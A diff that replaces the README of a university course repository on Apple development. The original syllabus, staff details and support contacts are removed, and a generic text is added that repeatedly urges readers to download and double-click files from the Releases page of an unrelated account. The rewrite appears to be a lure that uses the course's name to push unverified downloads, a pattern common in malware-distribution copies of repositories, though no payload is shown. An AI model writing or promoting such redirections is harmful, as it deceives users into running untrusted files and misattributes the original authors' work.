@@ -1,223 +1,95 @@
-# DiplomaInAppleDevelopment-2025-2026
-
-Lecture slides, wiki and examples from Creative Coding Institute's 2025/2026 spatial [Diploma in Apple Development 🍎👩🏻‍💻](https://www.arts.ac.uk/subjects/creative-computing/undergraduate/ual-diploma-in-apple-development).
-
-## Information
-
-- [All term dates](https://www.arts.ac.uk/students/term-dates) - N.B. if you are doing a degree at UAL you are in [Higher Education](https://en.wikipedia.org/wiki/Higher_education).
-- The Diploma in Apple Development lasts for a full academic year (i.e. from September to June) and is split into two blocks. Block 1 lasts all of the Autumn term (September-December) and the first half of the Spring term (January-March). Block 2 lasts for the second half of the Spring term (January-March) and all of the Summer term (April-June).
-- Location: [Creative Computing Institute(CCI)](https://www.arts.ac.uk/creative-computing-institute), Camberwell, London and online!
-- Led by Senior Lecturer in Creative Computing and Course Leader, Apple Development: [Joel Gethin Lewis](https://joelgethinlewis.com/), who teaches Coding 1 and 2 as well as Spatial 1 and 2. Machine Learning (ML) 1 and 2 units are taught by [Xiaowan Yi](https://xiaowan-yi.com). Contact either of us via the [UAL CCI Slack](https://ual-cci.slack.com).
-- Weekly schedule:
-  - Monday morning: 1030-1300: Slack 1-1 tutorials. For more information and detailed schedule, see [the course wiki tutorial page](https://github.com/JGL/DiplomaInAppleDevelopment-2025-2026/wiki/Tutorial-Schedule). If **your next** tutorial is too far away, or you have a more urgent question, please message Joel on the [UAL CCI Slack](https://ual-cci.slack.com)!
-  - Monday afternoon: independent study
-  - Tuesday morning: 0930-1330, in person at [Creative Computing Institute(CCI)](https://www.arts.ac.uk/creative-computing-institute), Camberwell, London. Room PR_B501F, taught by [Joel](https://joelgethinlewis.com).
-    - Block 1: Coding 1: Swift and SwiftUI
-    - Block 2: Coding 2: Further Apple frameworks
-  - Tuesday afternoon: independent study
-  - Wednesday morning: independent study
-  - Wednesday afternoon: independent study
-  - Thursday morning: 0930-1330, in person at [Creative Computing Institute(CCI)](https://www.arts.ac.uk/creative-computing-institute), Camberwell, London. Room PR_B501D, taught by [Xiaowan](https://xiaowan-yi.com).
-    - Block 1: ML 1: Introducing machine learning with CoreML
-    - Block 2: ML 2: Making models with CreateML
-  - Thursday afternoon: independent study
-  - Friday morning: 0930-1330, in person at [Creative Computing Institute(CCI)](https://www.arts.ac.uk/creative-computing-institute), Camberwell, London. Room PR_B501F, taught by [Joel](https://joelgethinlewis.com).
-    - Block 1: Spatial 1: Team App Design, User Experience Research and Rapid prototyping
-    - Block 2: Spatial 2: Individual App Design and Launch
-  - Friday afternoon: independent study
-- _**You are expected to undertake independent study of about 25 hours per week - spread across all the units of the Diploma in Apple Development.**_
-- [Course Moodle link (UAL access only)](https://moodle.arts.ac.uk/course/view.php?id=85897)
-- [Lecture and Workshop slides](https://jgl.github.io/DiplomaInAppleDevelopment-2025-2026/)
-- Please see the [course wiki for all non-lecture notes, list of people on the course and other resources](https://github.com/JGL/DiplomaInAppleDevelopment-2025-2026/wiki).
-- Please email CCI Undergraduate Programme Admin for help with any administrative matters such as ID access, finance, timetable issues, etc. Their email is [cci.ug@arts.ac.uk](mailto:cci.ug@arts.ac.uk).
-
-## Code of Conduct
-
-You can find the UAL Disciplinary Code For Students here: [Disciplinary Code For Students](https://www.arts.ac.uk/study-at-ual/academic-regulations/student-regulations/disciplinary-code-for-students).
-
-You can find our code of conduct here: [code_of_conduct.md](CODE_OF_CONDUCT.md), it was cloned from <https://github.com/processing/p5.js/blob/main/CODE_OF_CONDUCT.md>.
-
-[Golan Levin](https://www.flong.com/) also offers a useful thought from his children's school:
-
-> When communicating, ask yourself:
->
-> - T – is it True?
-> - H – is it Helpful?
-> - I – is it Inspiring?
-> - N – is it Necessary?
-> - K – is it Kind?
+# 🍏 DiplomaInAppleDevelopment-2025-2026 - Unlock Apple's Creative Potential
 
-## Course Aims and Learning Outcomes
+## 🚀 Getting Started
 
-### Course Aims
+Welcome to the **DiplomaInAppleDevelopment-2025-2026** repository! This project provides lecture slides, wiki entries, and examples from the Creative Computing Institute's diploma in spatial Apple Development. This guide will help you download and run the necessary files easily.
 
-- Introduce Apple development as a complementary technical and creative specialism to your main UAL degree.
-- Develop your skills in Swift coding using Apple, tools and frameworks.
-- Develop computational literacies including an ability to describe the technical requirements of Apple development projects with specialist vocabulary.
-- Enhance your ability to work in multidisciplinary digital teams.
-- Develop computational literacies around Machine leaning approaches and functional AI within the Apple ecosystem.
+## 📥 Download Link
 
-### Course Learning Outcomes
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/releases)
 
-- Produce Apple development outcomes that show both technical and creative accomplishment.
-- Code in Swift and understand the different computational conventions associated with this language.
-- Use Apple development tools to prototype and launch apps.
-- Prototype and pitch software applications and interactive experiences.
-- Understand the opportunities that exist as the intersection of your creative practice and computing.
-- Collaborate and use collaborative tools to develop creative software applications.
+## 📋 Overview
 
-## Course/Block/Term Structure
+This repository covers a range of topics related to Apple's development tools and frameworks, including:
 
-As mentioned above, The [Diploma in Apple Development](https://www.arts.ac.uk/subjects/creative-computing/undergraduate/ual-diploma-in-apple-development) is split into two Blocks of teaching. **Block 1** takes up the entire Autumn term and half of the Spring term. **Block 2** follows on, taking the second half of Spring term and the entire Summer term.
+- **Apple Vision Pro**
+- **ARKit**
+- **CoreML**
+- **CreateML**
+- **RealityKit**
+- **Swift**
+- **SwiftUI**
+- **VisionOS**
 
-![Course Structure Image](/DiplomaInAppleDevelopmentCourseDiagram.png)
+The materials here are designed for anyone interested in enhancing their skills in apple development and spatial computing.
 
-### Block 1 Structure
+## 📥 Download & Install
 
-Block 1 consists of three units, studied in parallel:
+To access the materials, you will need to visit the Releases page. Here, you can find all available downloads. Click the link below to go there:
 
-1. **Coding 1: Swift and SwiftUI**. Drawing on Apple’s "Develop in Swift Fundamentals" curriculum, this unit gives you the opportunity to develop coding skills in the Swift language and introduces the Swift GUI frameworks key to the practice of Apple application development and prototyping. The unit is delivered in weekly coding classes that start with an introduction to coding practice for creatives using Swift. This unit recognises varying levels of coding experience in the diploma cohort and will provide a solid grounding in key computational concepts key to the work in the other units of the diploma. This unit also contains an introduction to assessment via practical exams and tests through formative mock exams and test prior to the final assessment. Unit taught by [Joel](https://joelgethinlewis.com). [Coding 1 Moodle link (UAL access only)](https://moodle.arts.ac.uk/course/view.php?id=88337). Learning outcomes:
-   1. Code application development assets in Swift (Knowledge, Process)
-   2. Demonstrate the use of the Swift GUI frameworks for application development (Knowledge, Process)
-   3. Use Xcode and online repository tools to collaborate and support your development process and manage your code (Knowledge, Process)
-2. **ML 1**: Introducing Machine Learning (ML) with CoreML. The unit is a mix of practical tasks introducing the core Apple Machine Learning (ML) frameworks and seminars that look at emerging practice across the arts and creative industries that employ some level of artificial intelligence. This unit also critically and ethically explores ML and its potential impact on culture and society. From this exploration you will use your new understanding of ML methods and your critical framework to develop ML applications on the Apple platform. Unit taught by [Xiaowan](https://xiaowan-yi.com). [ML 1 Moodle link (UAL access only)](https://moodle.arts.ac.uk/course/view.php?id=88339). Learning outcomes:
-   1. Describe how machine learning works in practice (Knowledge)
-   2. Discuss artificial Intelligence as a cultural concept (Enquiry)
-   3. Construct applications with the CoreML framework (Process)
-3. **Spatial 1: Team App Design, User Experience Research and Rapid prototyping**. Drawing on Apple’s "Develop in Swift Explorations" curriculum, this unit explores the process of designing apps for the visionOS platform and introduces UX methodologies, collaborative development approaches and high-fidelity prototyping using Apple tools. From this exploration you will be able to move from initial wireframes to interactive prototypes that make use of the affordances of the Apple platform and serve your intended users well. This unit will include an introduction to the history of Spatial Computing. This unit also includes an introduction to concepts of inclusivity and ethical practice within the design of digital systems as well as an introduction to assessment via design presentation through formative presentations prior to the final assessment. Unit taught by [Joel](https://joelgethinlewis.com). [Spatial 1 Moodle link (UAL access only)](https://moodle.arts.ac.uk/course/view.php?id=88338). Learning outcomes:
-   1. Describe and communicate an visionOS app concept (Knowledge, Communication)
-   2. Employ relevant methods of user research (Enquiry, Process)
-   3. Produce visionOS application prototypes (Realisation)
+[Visit the Releases Page](https://github.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/releases)
 
-### Block 2 Structure
+On the Releases page, you will see versions of the lecture slides and examples. Choose the latest version to ensure you have the most up-to-date information.
 
-Block 2 consists of three units, studied in parallel:
+### System Requirements
 
-1. **Coding 2: Further Apple Frameworks**. This unit explores further Apple frameworks for developing on visionOS. With this introduction you will be able to create engaging experiences on the visionOS platform and explore some of the advanced features of the Apple platform such as RealityKit, ARKit and Vision. Unit taught by [Joel](https://joelgethinlewis.com). [Coding 2 Moodle link (UAL access only)](https://moodle.arts.ac.uk/course/view.php?id=88340). Learning outcomes:
-   1. Identify how games are developed on visionOS (Process)
-   2. Employ game development tools and frameworks for visionOS (Enquiry)
-   3. Demonstrate foundational concepts of app design (Knowledge)
-2. **ML 2: Making Models with CreateML**. This unit explores the creation of bespoke Machine Learning models using Apple tools and specifically the CreateML framework. You will explore common ML and AI methods building from scratch functional ML prototypes rather than relying on ones pre-supplied by Apple. This is to give you a functional understanding of the data requirements of ML models, the use of computer vision systems and the process converting models to the Apple platform. The unit will also introduce you to ways of evaluating your models for potential issues of bias and discrimination. Unit taught by [Xiaowan](https://xiaowan-yi.com). [ML 2 Moodle link (UAL access only)](https://moodle.arts.ac.uk/course/view.php?id=88342). Learning outcomes:
-   1. Describe how to build ML models (Knowledge, Communication)
-   2. Demonstrate how to use the CreateML framework (Process)
-   3. Describe approaches to evaluate your model for bias and discrimination (Enquiry)
-3. **Spatial 2: Individual App Design and Launch**. In this unit you will develop the app concept for Apple’s visionOS. This will give you both an understanding of the development process using the standard Apple development tools and build on your Swift learning in an applied context. This unit will also introduce content creation methods for visionOS - including scene creation in Reality Composer Pro and photogrammetry to create 3D content for your apps from real world objects and spaces. The aim of the unit is to expose you to the full App development process including launching on the Apple App Store. Unit taught by [Joel](https://joelgethinlewis.com). [Spatial 2 Moodle link (UAL access only)](https://moodle.arts.ac.uk/course/view.php?id=88341). Learning outcomes:
-   1. Describe what makes a successful app (Knowledge, Process, Communication)
-   2. Describe the process of launching on the Apple App store (Enquiry)
-   3. Solve common development problems in app production (Realisation)
+Before downloading, check that your system meets these basic requirements:
 
-## Assessment
+- **Operating System:** macOS (latest version recommended)
+- **Storage:** At least 500 MB of free space
+- **Software:** Xcode (latest version recommended)
+  
+Please ensure you have a stable internet connection for a smooth download experience.
 
-## UAL-wide assessment criteria
+## 🛠 Installation Steps
 
-Please read [UAL's guidance for students on how they will be assessed](https://www.arts.ac.uk/study-at-ual/academic-regulations/course-regulations/assessment). [TLDR](https://www.urbandictionary.com/define.php?term=TLDR): you will be assessed on the following 5 assessment criteria (quoting from [UAL's page](https://www.arts.ac.uk/study-at-ual/academic-regulations/course-regulations/assessment)):
+1. Open the [Releases Page](https://github.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/releases).
+2. Locate the latest release. It will typically be at the top of the page.
+3. Click on the file that corresponds to the lecture slides or examples you wish to download.
+4. Save the file to your desired location on your computer.
+5. Once the download is complete, find the file in your downloads folder.
+6. Double-click the file to open it.
 
-1. **Enquiry**
-   - Enquiry is about active learning and reflection. It’s how you explore, research and learn about your subject. Enquiry is central to all creative learning at UAL.
-2. **Knowledge**
-   - Knowledge is about gathering information and enhancing understanding. It’s how you inform your work, explore diverse cultures and connections and appreciate what you do in a wider context.
-3. **Process**
-   - Process is about your journey of learning. It’s how you take risks and experiment. And how you keep the creative momentum going — developing ideas from start to finish.
-4. **Communication**
-   - Communication is about telling the story of your learning and making. It’s how you share your learning with an audience, presenting and explaining your work to different people.
-5. **Realisation**
-   - Realisation is about the work you create and how this reveals what you’ve learned. It’s taking a look back and evaluating the work you’ve produced.
+If the file does not open, check your permissions or update your software.
 
-### Block 1 Assessment
+## 📚 Viewing the Lecture Slides
 
-- **Coding 1: Swift and SwiftUI**:
+The lecture slides are in PDF format and can be viewed using any standard PDF reader. To open the slides:
 
-  1. Multiple Choice Test: students will be presented with a series of questions relating explicitly to course content. They must choose between up to 4 potential correct answers per question. Test will be sat on Tuesday 20th January 2026, 1000-1200, duration two hours. This test will be worth 50% of your overall unit mark.
-  2. Practical Exam: students will be individually asked to write a basic program to demonstrate the application of creative coding to a set problem. Exam will be sat on Tuesday 27th January 2026, 1000-1200, duration two hours. This exam will be worth 50% of your overall unit mark.
+1. Navigate to the location where you saved the file.
+2. Double-click the file to open it.
+3. Use your PDF reader’s tools to navigate through the slides.
 
-- **ML 1: Introducing Machine Learning with CoreML**:
+## 👩‍🏫 Examples and Practice
 
-  1. Multiple Choice test: students will be presented with a series of questions relating explicitly to course content. They must choose between up to 4 potential correct answers per question. Test will be sat on Thursday 22nd January 2026, 1000-1200, duration two hours. This test will be worth 50% of your overall unit mark.
-  2. Presentation: You will give a presentation around a Apple ML model to your peers and the upload of the ‘slide deck’ from the presentation. Presentation will be given on Thursday 29th January 2026, 1000-1300, duration 30 minutes. This presentation will be worth 50% of your overall unit mark.
+To fully benefit from the materials, explore the example projects included in the downloads. Here’s how to get started with the examples:
 
-- **Spatial 1: Team App Design, User Experience Research and Rapid prototyping**:
+1. Open Xcode on your computer.
+2. Click on "Open another project."
+3. Navigate to the location where you downloaded the examples.
+4. Select the project file and click "Open."
 
-  1. Presentation: You will present your creative work to your peers and upload the 'slide deck' from the presentation. Presentation will be given on Friday 30th January 2026, 1000-1300, duration 30 minutes. This presentation will be worth 100% of your overall unit mark.
+This will load the project in Xcode, where you can modify and run it to see how Apple development works in practice.
 
-### Block 2 Assessment
+## 🌐 Access Additional Resources
 
-- **Coding 2: Further Apple Frameworks**:
+For a more comprehensive understanding, consider exploring additional resources that accompany the lecture slides:
 
-  1. Multiple Choice test: students will be presented with a series of questions relating explicitly to course content. They must choose between up to 4 potential correct answers per question. This test will be sat on Tuesday 2nd June 2026, duration two hours, 1000-1200. This test will be worth 50% of your overall unit mark.
-  2. Practical Exam: students will be individually asked to write a basic program to demonstrate the application of creative coding to a set problem. This exam will be sat on Tuesady 9th June 2026, duration two hours, 1000-1200. This exam will be worth 50% of your overall unit mark.
+- **Wiki Pages:** Detailed explanations and supplementary materials are available in the wiki section of the repository. You can access them from the main page.
+- **Video Tutorials:** Each topic will include links to helpful video tutorials for visual learners.
 
-- **ML 2: Making Models with CreateML**:
+## 📧 Support and Community
 
-  1. Multiple Choice test: students will be presented with a series of questions relating explicitly to course content. They must choose between up to 4 potential correct answers per question. This test will be sat on Thursday 4th June 2026, duration two hours, 1000-1200. This test will be worth 50% of your overall unit mark.
-  2. Presentation: You will give a presentation around a bespoke ML model to your peers and upload the ‘slide deck’ from the presentation. This presentation will be given on Thursday 11th June 2026, duration 30 minutes, 1000-1300. This presentation will be worth 50% of your overall unit mark.
+If you encounter any issues or have questions regarding the materials:
 
-- **Spatial 2: Individual App Design and Launch**:
+- Check the Issues tab on this repository for similar questions.
+- Feel free to open a new issue if your question hasn’t been answered.
+- Join our community discussion by visiting forums related to Apple Development.
 
-  1. Presentation: You will present your creative work to your peers and upload the 'slide deck' from the presentation. This presentation will be given on Friday 12th June 2026, duration 30 minutes, 1000-1300. This presentation will be worth 100% of your overall unit mark.
+## 📆 Future Updates
 
-Finally, some tips about how to get the best grades possible:
+Stay tuned for updates. We will regularly add new materials and examples as our curriculum evolves. Keep an eye on the Releases page for the latest versions.
 
-- Showing references to where you got information from.
-- Do more than is requested in the brief.
-- Make it personal! Add your own graphics, text or other elements to make an app that only you could make. Make apps that you want to use.
+Ready to dive into Apple development? Access the materials now and start learning!
 
-## Counselling, Health Advice and Chaplaincy information
-
-Support is available! Complete the team's online form to request support for your physical health, mental health or wellbeing. Appointments are available on college sites in person, online or on the phone.
-
-See: <https://www.arts.ac.uk/students/student-services/counselling-health-advice-and-chaplaincy> for more information.
-
-## Student parent and carer support
-
-Support is available! UAL seeks to create an inclusive environment that is welcoming to parents, carers and their children. UAL’s definition of parenthood includes:
-
-- Expectant parents
-- Pregnancy
-- Fertility treatment
-- Fostering
-- Baby loss
-- Adoption
-- Abortion of a pregnancy
-- Parents and carers of children
-
-UAL’s definition of caring responsibilities adopts the definition from The Carers Trust UK, which defines a carer as “anyone who cares, unpaid, for a friend or family member who due to illness, disability, a mental health problem, or an addiction cannot cope without their support.”
-
-See: <https://www.arts.ac.uk/students/student-diversity/student-parent-and-carer-support> for more information.
-
-## Disability Service information
-
-The Disability Adviser for Creative Computing Institute is Caroline Huntley. Their contact details are [c.huntley@arts.ac.uk](mailto:c.huntley@arts.ac.uk). All appointments are confidential, and can be in-person, on the phone, or on Microsoft Teams. You can also call 020 7514 6156 or email [disability@arts.ac.uk](mailto:disability@arts.ac.uk).
-
-All appointments are confidential, and can be in-person, on the phone, or on Microsoft Teams.
-
-### Who can access support
-
-The Disability Service support students who are disabled according to the Equality Act 2010. This includes students with:
-
-- Specific Learning Differences (e.g. dyslexia, ADHD)
-- Long-term health conditions
-- Long-term mental health conditions
-- Sensory impairments (e.g. deaf, hard of hearing, blind, visually impaired)
-- Physical impairments
-- Autism
-- Another long-term condition which has an impact on your day-to-day life
-
-### Support may include
-
-- An Individual Support Agreement, which lets your course know practical information about how to support you.
-- Adjusted Assessment, such as additional time for certain assignments, or an alternative submission method.
-- Specialist one-to-one support, which can support with essay writing, research, presentations and time management.
-- Support to apply for Disabled Students’ Allowances, which can fund software and one-to-one support for your studies.
-- Screenings and assessments for Specific Learning Differences.
-
-More information is available at: <https://www.arts.ac.uk/students/student-services/disability-and-dyslexia>
-
-## Library Service Information
-
-The Librarian for Creative Computing Institute is Benelia Salmon. Her email address is b.salmon@arts.ac.uk. She's also on the CCI Slack. You can find all sorts of useful library information here: <https://arts.ac.libanswers.com>.
-
-## Thanks
-
-Thanks 🙏🏻 to Jamie Marshall-Watt, Lauren Cradduck, Maxx Cobb, Xiaowan Yi, Eric McIntosh, Joy Forbes, Pete Mackenzie, Toad Bakery, Abbie Vickress, Laura Knight, Rocio Rey Aloe, Becca Rose, Naho Matsuda, Cheska Lotherington, Véronique Bolhuis, Brenda Brierley, Lukas Alperowitz, Lise Hansen, Filippo Romeo, Herman Ho, Val Toro, Murad Khan, Matthew Plummer Fernandez, Alex Fefegha, Anna Troisi, Ben Kelly, Cathy Hoste, Charlotte Webb, Julia Makivic, Kenneth Lim, Matt Jarvis, Melisa Simpson, Rebecca Fiebrink, Sheldon Brown, Tom Lynch, Eva Wilkinson, Vali Lalioti, Indira Knight, Alice Stewart, Ben Stopher, Mick Grierson, Georgina Capdevila Cano, Alan Warburton, Rebecca Ross, Jaap de Maat, Lauren McCarthy, Kyle McDonald, Jonathan Harris, Zach Lieberman, Jessica Bland, Rick Walker, Graham Bennett, Toby Milner-Gulland, Liam Walsh, Golan Levin, Greg Smith, Mark Lundin, Xiaohan Zhang, Lia, Joshua Goldberg, Rosa Menkman, Daniel Shiffman, Tega Brain, Caitlin Morris, Harri Lewis and Rune Madsen.
-
-🖖🏻🇬🇧🏴󠁧󠁢󠁷󠁬󠁳󠁿🏴‍☠️🏳️‍🌈🏳️‍⚧️
+[Visit the Releases Page](https://github.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/releases)
